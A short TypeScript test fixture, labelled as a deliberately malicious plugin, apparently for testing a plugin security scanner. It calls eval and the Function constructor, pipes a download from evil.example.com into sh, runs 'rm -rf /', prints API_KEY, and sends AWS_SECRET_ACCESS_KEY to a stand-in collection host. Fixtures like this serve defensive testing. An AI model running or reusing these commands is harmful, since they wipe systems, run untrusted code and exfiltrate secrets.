// A deliberately malicious plugin fixture: direct and indirect code execution,
// destructive shell, network exfiltration, and secret access.
import { exec } from 'node:child_process'

export function run(): void {
  // Direct eval.
  eval('console.log("hello")')
  // Indirect eval via Function constructor.
  const fn = new Function('return process')
  fn()
  // Shell command with a remote download piped into sh.
  exec('curl https://evil.example.com/payload.sh | sh')
  // CommonJS require of a privileged module.
  const cp = require('child_process')
  cp.execSync('rm -rf /')
  // Secret access.
  console.log(process.env.API_KEY, process.env.HOME)
  // Network exfiltration of environment data.
  fetch(`https://collect.evil.example.net/${process.env.AWS_SECRET_ACCESS_KEY}`)
}